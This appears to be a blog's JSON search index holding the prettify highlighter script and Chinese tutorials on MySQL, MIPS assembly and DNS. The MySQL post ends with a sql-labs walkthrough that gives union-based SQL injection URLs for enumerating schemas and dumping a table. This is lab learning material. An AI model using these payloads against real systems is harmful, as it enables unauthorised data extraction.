\"case,done,elif,esac,eval,fi,\" + \"function,in,local,set,then,until\"]; var ALL_KEYWORDS = [ CPP_KEYWORDS, CSHARP_KEYWORDS, JAVA_KEYWORDS, JSCRIPT_KEYWORDS, PERL_KEYWORDS, PYTHON_KEYWORDS, RUBY_KEYWORDS, SH_KEYWORDS]; var C_TYPES = /^(DIR|FILE|array|vector|(de|priority_)?queue|(forward_)?list|stack|(const_)?(reverse_)?iterator|(unordered_)?(multi)?(set|map)|bitset|u?(int|float)\\d*)\\b/; // token style names. correspond to css classes /** * token style for a string literal * @const */ var PR_STRING = 'str'; /** * token style for a keyword * @const */ var PR_KEYWORD = 'kwd'; /** * token style for a comment * @const */ var PR_COMMENT = 'com'; /** * token style for a type * @const */ var PR_TYPE = 'typ'; /** * token style for a literal value. e.g. 1, null, true. * @const */ var PR_LITERAL = 'lit'; /** * token style for a punctuation string. * @const */ var PR_PUNCTUATION = 'pun'; /** * token style for plain text. * @const */ var PR_PLAIN = 'pln'; /** * token style for an sgml tag. * @const */ var PR_TAG = 'tag'; /** * token style for a markup declaration such as a DOCTYPE. * @const */ var PR_DECLARATION = 'dec'; /** * token style for embedded source. * @const */ var PR_SOURCE = 'src'; /** * token style for an sgml attribute name. * @const */ var PR_ATTRIB_NAME = 'atn'; /** * token style for an sgml attribute value. * @const */ var PR_ATTRIB_VALUE = 'atv'; /** * A class that indicates a section of markup that is not code, e.g. to allow * embedding of line numbers within code listings. * @const */ var PR_NOCODE = 'nocode'; // Regex pattern below is automatically generated by regexpPrecederPatterns.pl // Do not modify, your changes will be erased. // CAVEAT: this does not properly handle the case where a regular // expression immediately follows another since a regular expression may // have flags for case-sensitivity and the like. Having regexp tokens // adjacent is not valid in any language I'm aware of, so I'm punting. // TODO: maybe style special characters inside a regexp as punctuation. /** * A set of tokens that can precede a regular expression literal in * javascript * http://web.archive.org/web/20070717142515/http://www.mozilla.org/js/language/js20/rationale/syntax.html * has the full list, but I've removed ones that might be problematic when * seen in languages that don't support regular expression literals. * * Specifically, I've removed any keywords that can't precede a regexp * literal in a syntactically legal javascript program, and I've removed the * \"in\" keyword since it's not a keyword in many languages, and might be used * as a count of inches. * * The link above does not accurately describe EcmaScript rules since * it fails to distinguish between (a=++/b/i) and (a++/b/i) but it works * very well in practice. * * @private * @const */ var REGEXP_PRECEDER_PATTERN = '(?:^^\\\\.?|[+-]|[!=]=?=?|\\\\#|%=?|&&?=?|\\\\(|\\\\*=?|[+\\\\-]=|->|\\\\/=?|::?|?>?=?|,|;|\\\\?|@|\\\\[|~|{|\\\\^\\\\^?=?|\\\\|\\\\|?=?|break|case|continue|delete|do|else|finally|instanceof|return|throw|try|typeof)\\\\s*'; /** * Given a group of {@link RegExp}s, returns a {@code RegExp} that globally * matches the union of the sets of strings matched by the input RegExp. * Since it matches globally, if the input strings have a start-of-input * anchor (/^.../), it is ignored for the purposes of unioning. * @param {Array.} regexs non multiline, non-global regexs. * @return {RegExp} a global regex. */ function combinePrefixPatterns(regexs) { var capturedGroupIndex = 0; var needToFoldCase = false; var ignoreCase = false; for (var i = 0, n = regexs.length; i < n; ++i) { var regex = regexs[i]; if (regex.ignoreCase) { ignoreCase = true; } else if (/[a-z]/i.test(regex.source.replace( /\\\\u[0-9a-f]{4}|\\\\x[0-9a-f]{2}|\\\\[^ux]/gi, ''))) { needToFoldCase = true; ignoreCase = false; break; } } var escapeCharToCodeUnit = { 'b': 8, 't': 9, 'n': 0xa, 'v': 0xb, 'f': 0xc, 'r': 0xd }; function decodeEscape(charsetPart) { var cc0 = charsetPart.charCodeAt(0); if (cc0 !== 92 /* \\\\ */) { return cc0; } var c1 = charsetPart.charAt(1); cc0 = escapeCharToCodeUnit[c1]; if (cc0) { return cc0; } else if ('0' /i], // Unescaped content in javascript. (Or possibly vbscript). ['lang-js', /^]*>([\\s\\S]*?)(]*>)/i], // Contains unescaped stylesheet content ['lang-css', /^]*>([\\s\\S]*?)(]*>)/i], ['lang-in.tag', /^()/i] ]), ['default-markup', 'htm', 'html', 'mxml', 'xhtml', 'xml', 'xsl']); registerLangHandler( createSimpleLexer( [ [PR_PLAIN, /^[\\s]+/, null, ' \\t\\r\\n'], [PR_ATTRIB_VALUE, /^(?:\\\"[^\\\"]*\\\"?|\\'[^\\']*\\'?)/, null, '\\\"\\''] ], [ [PR_TAG, /^^$/i], [PR_ATTRIB_NAME, /^(?!style[\\s=]|on)[a-z](?:[\\w:-]*\\w)?/i], ['lang-uq.val', /^=\\s*([^>\\'\\\"\\s]*(?:[^>\\'\\\"\\s\\/]|\\/(?=\\s)))/], [PR_PUNCTUATION, /^[=\\/]+/], ['lang-js', /^on\\w+\\s*=\\s*\\\"([^\\\"]+)\\\"/i], ['lang-js', /^on\\w+\\s*=\\s*\\'([^\\']+)\\'/i], ['lang-js', /^on\\w+\\s*=\\s*([^\\\"\\'>\\s]+)/i], ['lang-css', /^style\\s*=\\s*\\\"([^\\\"]+)\\\"/i], ['lang-css', /^style\\s*=\\s*\\'([^\\']+)\\'/i], ['lang-css', /^style\\s*=\\s*([^\\\"\\'>\\s]+)/i] ]), ['in.tag']); registerLangHandler( createSimpleLexer([], [[PR_ATTRIB_VALUE, /^[\\s\\S]+/]]), ['uq.val']); registerLangHandler(sourceDecorator({ 'keywords': CPP_KEYWORDS, 'hashComments': true, 'cStyleComments': true, 'types': C_TYPES }), ['c', 'cc', 'cpp', 'cxx', 'cyc', 'm']); registerLangHandler(sourceDecorator({ 'keywords': 'null,true,false' }), ['json']); registerLangHandler(sourceDecorator({ 'keywords': CSHARP_KEYWORDS, 'hashComments': true, 'cStyleComments': true, 'verbatimStrings': true, 'types': C_TYPES }), ['cs']); registerLangHandler(sourceDecorator({ 'keywords': JAVA_KEYWORDS, 'cStyleComments': true }), ['java']); registerLangHandler(sourceDecorator({ 'keywords': SH_KEYWORDS, 'hashComments': true, 'multiLineStrings': true }), ['bash', 'bsh', 'csh', 'sh']); registerLangHandler(sourceDecorator({ 'keywords': PYTHON_KEYWORDS, 'hashComments': true, 'multiLineStrings': true, 'tripleQuotedStrings': true }), ['cv', 'py', 'python']); registerLangHandler(sourceDecorator({ 'keywords': PERL_KEYWORDS, 'hashComments': true, 'multiLineStrings': true, 'regexLiterals': 2 // multiline regex literals }), ['perl', 'pl', 'pm']); registerLangHandler(sourceDecorator({ 'keywords': RUBY_KEYWORDS, 'hashComments': true, 'multiLineStrings': true, 'regexLiterals': true }), ['rb', 'ruby']); registerLangHandler(sourceDecorator({ 'keywords': JSCRIPT_KEYWORDS, 'cStyleComments': true, 'regexLiterals': true }), ['javascript', 'js', 'ts', 'typescript']); registerLangHandler(sourceDecorator({ 'keywords': COFFEE_KEYWORDS, 'hashComments': 3, // ### style block comments 'cStyleComments': true, 'multilineStrings': true, 'tripleQuotedStrings': true, 'regexLiterals': true }), ['coffee']); registerLangHandler( createSimpleLexer([], [[PR_STRING, /^[\\s\\S]+/]]), ['regex']); /** @param {JobT} job */ function applyDecorator(job) { var opt_langExtension = job.langExtension; try { // Extract tags, and convert the source code to plain text. var sourceAndSpans = extractSourceSpans(job.sourceNode, job.pre); /** Plain text. @type {string} */ var source = sourceAndSpans.sourceCode; job.sourceCode = source; job.spans = sourceAndSpans.spans; job.basePos = 0; // Apply the appropriate language handler langHandlerForExtension(opt_langExtension, source)(job); // Integrate the decorations and tags back into the source code, // modifying the sourceNode in place. recombineTagsAndDecorations(job); } catch (e) { if (win['console']) { console['log'](e && e['stack'] || e); } } } /** * Pretty print a chunk of code. * @param sourceCodeHtml {string} The HTML to pretty print. * @param opt_langExtension {string} The language name to use. * Typically, a filename extension like 'cpp' or 'java'. * @param opt_numberLines {number|boolean} True to number lines, * or the 1-indexed number of the first line in sourceCodeHtml. */ function $prettyPrintOne(sourceCodeHtml, opt_langExtension, opt_numberLines) { /** @type{number|boolean} */ var nl = opt_numberLines || false; /** @type{string|null} */ var langExtension = opt_langExtension || null; /** @type{!Element} */ var container = document.createElement('div'); // This could cause images to load and onload listeners to fire. // E.g. . // We assume that the inner HTML is from a trusted source. // The pre-tag is required for IE8 which strips newlines from innerHTML // when it is injected into a tag. // http://stackoverflow.com/questions/451486/pre-tag-loses-line-breaks-when-setting-innerhtml-in-ie // http://stackoverflow.com/questions/195363/inserting-a-newline-into-a-pre-tag-ie-javascript container.innerHTML = '' + sourceCodeHtml + ''; container = /** @type{!Element} */(container.firstChild); if (nl) { numberLines(container, nl, true); } /** @type{JobT} */ var job = { langExtension: langExtension, numberLines: nl, sourceNode: container, pre: 1, sourceCode: null, basePos: null, spans: null, decorations: null }; applyDecorator(job); return container.innerHTML; } /** * Find all the {@code } and {@code } tags in the DOM with * {@code class=prettyprint} and prettify them. * * @param {Function} opt_whenDone called when prettifying is done. * @param {HTMLElement|HTMLDocument} opt_root an element or document * containing all the elements to pretty print. * Defaults to {@code document.body}. */ function $prettyPrint(opt_whenDone, opt_root) { var root = opt_root || document.body; var doc = root.ownerDocument || document; function byTagName(tn) { return root.getElementsByTagName(tn); } // fetch a list of nodes to rewrite var codeSegments = [byTagName('pre'), byTagName('code'), byTagName('xmp')]; var elements = []; for (var i = 0; i < codeSegments.length; ++i) { for (var j = 0, n = codeSegments[i].length; j < n; ++j) { elements.push(codeSegments[i][j]); } } codeSegments = null; var clock = Date; if (!clock['now']) { clock = { 'now': function () { return +(new Date); } }; } // The loop is broken into a series of continuations to make sure that we // don't make the browser unresponsive when rewriting a large page. var k = 0; var langExtensionRe = /\\blang(?:uage)?-([\\w.]+)(?!\\S)/; var prettyPrintRe = /\\bprettyprint\\b/; var prettyPrintedRe = /\\bprettyprinted\\b/; var preformattedTagNameRe = /pre|xmp/i; var codeRe = /^code$/i; var preCodeXmpRe = /^(?:pre|code|xmp)$/i; var EMPTY = {}; function doWork() { var endTime = (win['PR_SHOULD_USE_CONTINUATION'] ? clock['now']() + 250 /* ms */ : Infinity); for (; k < elements.length && clock['now']() < endTime; k++) { var cs = elements[k]; // Look for a preceding comment like // var attrs = EMPTY; { for (var preceder = cs; (preceder = preceder.previousSibling);) { var nt = preceder.nodeType; // is parsed by HTML 5 to a comment node (8) // like , but in XML is a processing instruction var value = (nt === 7 || nt === 8) && preceder.nodeValue; if (value ? !/^\\??prettify\\b/.test(value) : (nt !== 3 || /\\S/.test(preceder.nodeValue))) { // Skip over white-space text nodes but not others. break; } if (value) { attrs = {}; value.replace( /\\b(\\w+)=([\\w:.%+-]+)/g, function (_, name, value) { attrs[name] = value; }); break; } } } var className = cs.className; if ((attrs !== EMPTY || prettyPrintRe.test(className)) // Don't redo this if we've already done it. // This allows recalling pretty print to just prettyprint elements // that have been added to the page since last call. && !prettyPrintedRe.test(className)) { // make sure this is not nested in an already prettified element var nested = false; for (var p = cs.parentNode; p; p = p.parentNode) { var tn = p.tagName; if (preCodeXmpRe.test(tn) && p.className && prettyPrintRe.test(p.className)) { nested = true; break; } } if (!nested) { // Mark done. If we fail to prettyprint for whatever reason, // we shouldn't try again. cs.className += ' prettyprinted'; // If the classes includes a language extensions, use it. // Language extensions can be specified like // // the language extension \"cpp\" is used to find a language handler // as passed to PR.registerLangHandler. // HTML5 recommends that a language be specified using \"language-\" // as the prefix instead. Google Code Prettify supports both. // http://dev.w3.org/html5/spec-author-view/the-code-element.html var langExtension = attrs['lang']; if (!langExtension) { langExtension = className.match(langExtensionRe); // Support var wrapper; if (!langExtension && (wrapper = childContentWrapper(cs)) && codeRe.test(wrapper.tagName)) { langExtension = wrapper.className.match(langExtensionRe); } if (langExtension) { langExtension = langExtension[1]; } } var preformatted; if (preformattedTagNameRe.test(cs.tagName)) { preformatted = 1; } else { var currentStyle = cs['currentStyle']; var defaultView = doc.defaultView; var whitespace = ( currentStyle ? currentStyle['whiteSpace'] : (defaultView && defaultView.getComputedStyle) ? defaultView.getComputedStyle(cs, null) .getPropertyValue('white-space') : 0); preformatted = whitespace && 'pre' === whitespace.substring(0, 3); } // Look for a class like linenums or linenums: where is the // 1-indexed number of the first line. var lineNums = attrs['linenums']; if (!(lineNums = lineNums === 'true' || +lineNums)) { lineNums = className.match(/\\blinenums\\b(?::(\\d+))?/); lineNums = lineNums ? lineNums[1] && lineNums[1].length ? +lineNums[1] : true : false; } if (lineNums) { numberLines(cs, lineNums, preformatted); } // do the pretty printing var prettyPrintingJob = { langExtension: langExtension, sourceNode: cs, numberLines: lineNums, pre: preformatted, sourceCode: null, basePos: null, spans: null, decorations: null }; applyDecorator(prettyPrintingJob); } } } if (k < elements.length) { // finish up in a continuation win.setTimeout(doWork, 250); } else if ('function' === typeof opt_whenDone) { opt_whenDone(); } } doWork(); } /** * Contains functions for creating and registering new language handlers. * @type {Object} */ var PR = win['PR'] = { 'createSimpleLexer': createSimpleLexer, 'registerLangHandler': registerLangHandler, 'sourceDecorator': sourceDecorator, 'PR_ATTRIB_NAME': PR_ATTRIB_NAME, 'PR_ATTRIB_VALUE': PR_ATTRIB_VALUE, 'PR_COMMENT': PR_COMMENT, 'PR_DECLARATION': PR_DECLARATION, 'PR_KEYWORD': PR_KEYWORD, 'PR_LITERAL': PR_LITERAL, 'PR_NOCODE': PR_NOCODE, 'PR_PLAIN': PR_PLAIN, 'PR_PUNCTUATION': PR_PUNCTUATION, 'PR_SOURCE': PR_SOURCE, 'PR_STRING': PR_STRING, 'PR_TAG': PR_TAG, 'PR_TYPE': PR_TYPE, 'prettyPrintOne': IN_GLOBAL_SCOPE ? (win['prettyPrintOne'] = $prettyPrintOne) : (prettyPrintOne = $prettyPrintOne), 'prettyPrint': IN_GLOBAL_SCOPE ? (win['prettyPrint'] = $prettyPrint) : (prettyPrint = $prettyPrint) }; // Make PR available via the Asynchronous Module Definition (AMD) API. // Per https://github.com/amdjs/amdjs-api/wiki/AMD: // The Asynchronous Module Definition (AMD) API specifies a // mechanism for defining modules such that the module and its // dependencies can be asynchronously loaded. // ... // To allow a clear indicator that a global define function (as // needed for script src browser loading) conforms to the AMD API, // any global define function SHOULD have a property called \"amd\" // whose value is an object. This helps avoid conflict with any // other existing JavaScript code that could have defined a define() // function that does not conform to the AMD API. var define = win['define']; if (typeof define === \"function\" && define['amd']) { define(\"google-code-prettify\", [], function () { return PR; }); } })(); return prettyPrint; })(); // If this script is deferred or async and the document is already // loaded we need to wait for language handlers to load before performing // any autorun. function onLangsLoaded() { if (autorun) { contentLoaded( function () { var n = callbacks.length; var callback = n ? function () { for (var i = 0; i < n; ++i) { (function (i) { win.setTimeout( function () { win['exports'][callbacks[i]].apply(win, arguments); }, 0); })(i); } } : void 0; prettyPrint(callback); }); } } checkPendingLanguages(); }());","link":"/plugins/prettify/run_prettify.js"}],"posts":[{"title":"MYSQL的学习","text":"[ MYSQL的学习 ] 简单介绍了一下使用及SQL注入的奇淫技巧，详细解释请自查手册文档等等. SQL注入的分类：基于从服务器接收到的响应 基于错误的SQL注入 联合查询的类型 堆查询注射 SQL盲注 - 布尔盲注 - 时间盲注 - 报错盲注 基于如何处理输入的SQL查询 基于字符串 数字或整数为基础 基于程度和顺序的注入 一阶注射 二阶注射 通过用户输入的表单域的注射 通过cookie注射 通过服务器变量注射 DQL语言常用专业用语 DB：数据库 (Database) DBMS：数据库管理系统 (Database Management System) SQL：结构化查询语言，用于与数据库交互的语言 字段：数据表的列 常用SQL语句 查询所有数据库：show databases; 查询当前数据库中所有数据表：show tables; 查询某个表结构：desc [数据表名]; @@datadir：数据库路径 @@version_compile_os：操作系统版本 注释符号 12单行注释：# 或 -- 或 /**/多行注释：-- SELECT基础查询：1234567去重查询： select distinct ... ;单字段查询：select [字段名称] from [表名称];多字段查询：select [字段名称], [字段名称] from [表名称];查询所有： select * from [表名称];查询函数： select [函数名称];查询表达式：select [运算公式];查询常量： select [常量]; 取别名： 1234561. [原名称] as [新名称]2. [原名称] [新名称]样例:select first_name hahaha, last_name as hehehehe from users;当新名称中含有特殊字符，请使用引号包裹起来如下:select uid as \"e eee\", sex \"a aaa\" from users; 操作符优先级(优先级高优先运算) 12345678910111213141516171819202122232425262728293031:=||, OR, XOR&amp;&amp;, ANDNOTBETWEEN, CASE, WHEN, THEN, ELSE=, &lt;=&gt;, &gt;=, &gt;, &lt;=, &lt;, &lt;&gt;, !=, IS, LIKE, REGEXP, IN|&amp;&lt;&lt;, &gt;&gt;-, +*, /, DIV, %, MOD^- (一元减号), ~ (一元比特反转)!BINARY, COLLATE注意：若开启HIGH_NOT_PRECEDENCE SQL模式被激活，NOT的优先级与 ! 同级 ‘+’ 的作用 1234仅为运算符1. 数值型 + 数值型 ：作加法运算2. 数值型 + 字符型 ：系统试图将字符型转换为数值型，若转换成功则加法运算，否则字符型值转换为0与数值型相加。3. 数值型 + null ：null，注意只要有null，便全为null 拼接函数 CONCAT() 12345678910返回结果为连接参数产生的字符串1. 如有任何一个参数为NULL ，则返回值为 NULL。2. 如果所有参数均为非二进制字符串，则结果为非二进制字符串。 3. 如果自变量中含有任一二进制字符串，则结果为一个二进制字符串。例如：select concat(-1,0,0.1,1);select concat(-1,\"null\");select concat(\"-1\",\"null\");select concat(\"null\",null);附加一个函数concat_ws()，把上面的SQL语句中的concat换成concat_ws试试 条件查询：1select [查询列表] from [表名] where [筛选条件]; 条件表达式筛选： 12&gt; &lt; = != &lt;&gt; &gt;= &lt;=例：select id haha from users where id&gt;1 &amp;&amp; id!=2 &amp;&amp; id&lt;&gt;3 &amp;&amp; id&gt;=4 &amp;&amp; id&lt;=5 &amp;&amp; id&lt;6 || id=7; 注意：&lt;=&gt; 为安全等于，这个操作符和=操作符执行相同的比较操作，不过在两个操作码均为NULL时，其所得值为1而不为NULL，而当一个操作码为NULL时，其所得值为0而不为NULL。 逻辑表达式筛选： 123&amp;&amp; ! || and or not例：select id haha from users where not (id=-1 and id=1 or !(id=2 || id=3) &amp;&amp; id&lt;&gt;4); 模糊查询 like 与通配符搭配% 百分号表示多字节通配_ 下划线表示单字节通配\\ 斜杠表示转义符注意：ESCAPE关键词可以指定某些符号为转义符 1234例：查询名字第二个字符为'_'，第三个字符为'%'的字符串select * from users where username like '_\\_\\%%';select * from users where username like '_a_a%%' ESCAPE 'a'; between and In is null 123456789between [条件] and [条件]In [条件]is null [条件]例：查询 id 1-3的用户select * from users where id between 1 and '3';select * from users where id in(\"1\", 2, '3');查询 id 为空的用户select * from users where email is null; 排序查询语法 12345select [查询列表] from [数据表] where [筛选条件] order by [排序列表] [asc|desc]注意：排序列表可以为表头，表示通过该字段排序，当为数字n时，表示通过当前查询的第n个字段来排序。比如下表结构中：select username from users order by 1; 表示通过username排序查询, 如果把 1 改为 2 则报错。而 select * from users order by 1; 表示通过 id 排序查询, 如果把 1 增加到 5 则报错。即如果数字超出查询字段的个数范围则报错。 解释：asc为升序，desc为降序，默认为升序.例子： 123456789desc users; # 表结构如下+----------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+----------------+| id | int(11) | NO | PRI | NULL | auto_increment || username | varchar(20) | NO | | NULL | || email | varchar(50) | NO | | NULL | || password | varchar(32) | NO | | NULL | |+----------+-------------+------+-----+---------+----------------+ 1.普通排序 123456select username from users order by username asc;select username from users order by 1 asc;select username from users order by username;select username from users order by 1;select username from users order by username desc;select username from users order by 1 desc; 2.表达式排序 1select * from users order by (-id*id+4*id-6) asc; 3.别名排序 1select username haha from users order by haha desc; 4.函数排序 1select * from users order by length(username) desc; 5.多项排序 1select * from users order by length(username) desc,username desc; 常见函数单行函数1.字符函数 函数名称 函数作用 length() 返回字符串的长度 concat() 连接字符串 upper() 字符串变大写 lower() 字符串变小写 substr() 截取子串 substring() 截取子串 instr() 返回字串第一次出现的索引，如果找不到返回0 trim() 去前后空格 lpad() 左填充 rpad() 右填充 replace() 字符串替换 2.数学函数 函数名称 函数作用 round() 四舍五入 ceil() 向上取整 floor() 向下取整 truncate() 截断 mod() 取余 rand() 返回0-1之间的小数 3.日期函数 函数名称 函数作用 now() 返回系统当前日期 + 时间 curdate() 返回系统当前日期 curtime() 返回系统当前日期 month() 通过日期获取月份，同样的还有年（year），周（week），日（day），小时（hour），分钟（minute），秒（second） monthname() 通过日期获取英文月份 date_format() 将日期转换为字符 str_to_date() 将日期格式的字符转换成为指定格式的日期，若格式不对则返回 null ，如str_to_date(‘4-20-2018’, ‘%m-%d-%Y’) datediff() 返回两个日期相差的天数 MYSQL中时间的格式符表 序号 格式符 功能 1 %Y 四位的年份 2 %y 两位的年份 3 %m 月份(01,02…11,12) 4 %c 月份(1,2…11,12) 5 %d 日(01,02…) 6 %H 小时(24小时制) 7 %h 小时(12小时制) 8 %i 分钟(00,01,…59) 9 %s 秒(00,01,…59) 4.其他函数 函数名称 函数作用 user() 返回当前话路被验证的用户名和主机名组合。 database() 返回使用 utf8 字符集的默认(当前)数据库名。在存储程序里，默认数据库是同该程序向关联的数据库，但并不一定与调用语境的默认数据库相同。 version() 返回指示 MySQL 服务器版本的字符串。这个字符串使用 utf8 字符集。 password(‘str’) 加密并返回该字符 md5() md5加密并返回 5.流程控制函数 1&gt; if 函数：if else 的效果 12if (条件表达式, 表达式1， 表达式2)如果条件表达式满足条件，则表达式1的值，否则表达式2的值 例：select username, if(id&gt;1, ‘会员’, ‘非会员’) from users; # 若id &gt; 1为会员，反之没有，输出所有用户的会员情况 2&gt; case 函数的使用一：switch case 的效果 12345678910111213141.case 要判断的字段或表达式when 常量1 then 要显示的值1或语句1when 常量2 then 要显示的值2或语句2...else 要显示的值n或语句nend2.casewhen 条件1 then 要显示的值1或语句1when 条件2 then 要显示的值2或语句2...else 要显示的值n或语句nend 例如： 12345678910111213141516#exp1:select username, id, case id when 0 then 'hahahaha' when 1 then 'hehehehe' else 'eeeeeeee' end as 'o.o.o.o' from users; #exp2:select username, id, case when id&lt;1 then 'hahahaha' when id=1 then 'hehehehe' else 'eeeeeeee' end as 'o.o.o.o' from users; 分组函数用作统计使用，又称为聚合函数或统计函数或组函数。简单说就算，常用于分组查询的函数，且他们能处理NULL。 分类： sum 求和、avg 平均值、max 最大值、min 最小值、count 计算个数 注意：一般sum 和 avg用于处理数值型，而max, min, count可以处理任何数据类型，count(字段)用于统计字段非空值的个数，count(*)常用于统计行数 简例： 12select sum(id), avg(id), max(id), count(*) from users;select sum(birthday), avg(birthday), max(birthday), count(*) from users; 分组查询语法 12345675 select 分组函数, 分组后的字段1 from 表名称 2 [where 筛选条件]3 group by 分组的列表4 [having 分组后的筛选]6 [order by 子句]注意：查询列表必须特殊，要求是分组函数和group by后出现的字段，123456为筛选顺序 注意：查询列表必须特殊，要求是分组函数和group by后出现的字段 分组查询中的筛选条件分为两类 数据源 位置 关键字 分组前筛选 原始表 group by 子句的前面 where 分组后筛选 分组后的结果集 group by 子句的后面 having 分组函数做条件必然放在 having 中，且优先考虑能用分组前筛选的（效率高） group by 子句支持单个字段分组，多个字段分组（多个字段之间用逗号隔开没有顺序要求），表达式或函数 添加排序，置于整个分组查询的最后 连接查询当需要同时查询多个表的数据使用。若无有效的连接条件，则为笛卡儿积 12select 字段1,字段2,...from 表1, 表2,... 年代分类： sql192版本 等值，非等值，自连接，也支持一部分外连接(用于oracle，sqlserver，mysql不支持) 等值连接 1234567select 查询列表from 表1 [别名1],表2 [别名2],...where 表1.字段 = 表2.字段[and 筛选条件][group by 分组字段][having 分组后的筛选][order by 排序字段] 注意：1.防止表字段名重复，通常给表起别名，也是为了缩短查询语句2.多表无主从之分，即没有顺序3.n表查询至少需要n-1个连接条件4.查询结果为多表的交集部分 非等值连接 1234567select 查询列表from 表1 [别名1],表2 [别名2],...where 非等值条件[and 筛选条件][group by 分组字段][having 分组后的筛选][order by 排序字段] 自连接 同上 sql199版本 12345678select 查询列表from 表1 别名 [连接类型关键字] join 表2 别名 on 连接条件[where 筛选条件][group by 分组字段][having 分组后的筛选][order by 排序字段] 连接类型 内连接：可以理解为对两个表并集运算再加筛选条件，其中有等值连接，非等值连接，自连接，关键字为：inner具体语法类型192版本，可省略 inner关键字，如下 123456789select 查询列表from 表1 别名 [inner] join 表2 别名 on 连接条件[where 筛选条件][group by 分组字段][having 分组后的筛选][order by 排序字段]limit [子句] 外连接：outer用于查询一个表中有，另一个表没有的记录。可以理解为对两个表交集运算再加筛选条件。外连接查询的结果为主表中的所有记录如果从表能与之匹配，则显示匹配的值如果从表不能匹配他，则显示NULL外连接查询的结果 = 内连接结果 + 主表中有而从表没有的记录，即 左外，left [outer] ，左为主表右外，right [outer] ，右为主表，左外右外交换两个表的顺序可以实现相同效果全外(mysql不支持) full [outer] ，全外连接 = 内连接的结果 + 表1中有而表2无 + 表2中有而表1无(或者说，全外连接 = 表1 U 表 2) 123456789select 查询列表from 表1 别名 left|right|full [outer] join 表2 别名 on 连接条件[where 筛选条件][group by 分组字段][having 分组后的筛选][order by 排序字段]limit [子句] 交叉连接：cross 123select 查询列表from 表1 别名cross join 表2 别名 实质上就是笛卡儿积 MYSQL注入select注入找到注入点，union注入，查库，查表、查数据 这里拿sql-labs作为例子，常见的select回显注入 1234567891011121314151617181920212223判断查询字段数http://192.168.10.109/Less-41/?id=1 order by 4#http://192.168.10.109/Less-41/?id=1 order by 3#查看回显数据http://192.168.10.109/Less-41/?id=-1 union select 1,2,3#查看当前用户、数据库名称http://192.168.10.109/Less-41/?id=-1 union select 1,user(),database()#查所有数据库http://192.168.10.109/Less-41/?id=-1 union select 1,user(),group_concat(schema_name) from information_schema.schemata --+通过表名的hex值或者表名查某个库的表(不过这题需要用hex值)，hex值可以用python的http://192.168.10.109/Less-41/?id=-1 union select 1,user(),group_concat(table_name) from information_schema.tables where table_schema=flag --+http://192.168.10.109/Less-41/?id=-1 union select 1,user(),group_concat(table_name) from information_schema.tables where table_schema=0x666C6167 --+查询表的字段名http://192.168.10.109/Less-41/?id=-1 union select 1,user(),group_concat(column_name) from information_schema.columns where table_name=0x666C61677461626C65--+查表数据http://192.168.10.109/Less-41/?id=-1 union select 1,user(),group_concat(id,0x3A,flag) from flag.flagtable--+ 注意： 失效尝试使用 --+ 了解盲注和普通的SQL注入原理是一样的，不同在哪里？ 通过SQLiLabs学习sql注入 识别sql注入漏洞点，利用SQL语句拆解整个数据库结构，最后提取出我们要的flag表中信息","link":"/2016/04/15/2016/MYSQL%E7%9A%84%E5%AD%A6%E4%B9%A0/"},{"title":"MIPS 汇编简单学习","text":"汇编之MIPS 汇编 What ‘s the MIPS?汇编语言首先要普及一下汇编的相关知识，汇编语言是一类语言的总称，因处理器的不同，而对应着不同的机器语言指令集，产生了很多种汇编语言，如，基于INTEL 8086处理器的x8086汇编语言，还有接下来要说到的MIPS汇编语言。汇编语言不像高级语言Java，Python，Kotlin等，只要配置相关环境，同一段代码可以在不同操作系统上运行，而不同操作系统，不同的指令集，就要用不同的汇编语言。 MIPS为了选择一个大家能一起玩的，又要很方便的汇编语言，我选择了MIPS(Million Instructions Per Second)。至于具体原因，emmmm，，，，，再说再说。 工具俗话说，预先善其事必先利器其。MIPS有一个十分Perfect的工具MIPS MARS。提醒一下，因为工具是jar，所以请事先配置Java环境。 Get ItHello World12345$ print (\"hello world\")$ echo hello world$ System.out.println(\"hello world\");$ cout &lt;&lt; \"hello world\";... 不知道有没有你熟悉的一套，想用MIPS写一个hello world可没那么简单。首先我们了解一下这个Mars的界面。 介绍本章的几个指令 li [地址值] , [参数值] add [地址值] , [地址值] , [地址值 | 参数值] move [地址值1], [地址值2] 123456789li $t1, 1li $t2, 2# $t1 = 1, $t2 = 2add $t1, $t1, $t2# $t1 = $t1 + $t2move $t1, $t2# $t1 = $t2 把这个写完以后，点击菜单栏 File-save 或 Ctrl + S保存，再点击菜单栏 Run-Assemble 或 F3键。 然后好戏开始了~~~~，我们可以点击哪两个大大的运行(单步和一步)，推荐单步调试，仔细关注一下右边CPU的情况，最后，当当当，存储在$t1中的值变成了 3 。 我相信肯定很多人觉得不愿意，没有输出在界面下面，下面不舒服。 syscall #打印 $a0 中的参数 \\$v0 的参数值决定 syscall 的输出类型，syscall 输出的值为 固定地址的值。你们要好好看帮助文档，如果我都写下来就是对你们的溺爱。(一本正经胡说八道，原谅我懒得一个一个敲…orz) 由帮助文档我们知道，当 \\$v0 值为1时，syscall 会输出 interger类型的 \\$a0 参数值。那么完整版 1 + 2 = 3来了。 123456li $t1, 298li $t2, 222add $t2, $t1, $t2move $a0, $t2li $v0, 1syscall 编程格式在稍微大一点的代码，我们会将汇编代码的写为如下格式。 1234.data #数据段.text #代码段 la 指令是使地址1指向地址2。 la [地址值1], [地址值2] 数据的类似于设置全局变量，代码段类似于代码的主函数。我们回到正题，是时候放出 Hello World 了。 12345678# 论加\\0的重要性.datamsg0: .ascii \"hello world\"msg1: .ascii \"dont see me\".textla $a0, msg0li $v0, 4syscall 注: 这就是为什么C字符串要以\\0结尾了。233333333333","link":"/2016/04/04/2016/MIPS%20%E6%B1%87%E7%BC%96%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"},{"title":"DNS应用","text":"DNS 是互联网核心协议之一。不管是上网浏览，还是编程开发，都需要了解一点它的知识。（本文部分摘自阮一峰大佬的博客） 本文详细介绍DNS的原理，以及如何运用工具软件观察它的运作。我的目标是，读完此文后，你就能完全理解DNS。 一、DNS 是什么？DNS （Domain Name System 的缩写）的作用非常简单，就是根据域名查出IP地址。你可以把它想象成一本巨大的电话本。 举例来说，如果你要访问域名math.stackexchange.com，首先要通过DNS查出它的IP地址是151.101.129.69。 如果你不清楚为什么一定要查出IP地址，才能进行网络通信，建议先阅读我写的《互联网协议入门》。 二、查询过程虽然只需要返回一个IP地址，但是DNS的查询过程非常复杂，分成多个步骤。 工具软件dig可以显示整个查询过程。 1$ dig math.stackexchange.com 上面的命令会输出六段信息。 第一段是查询参数和统计。 第二段是查询内容。 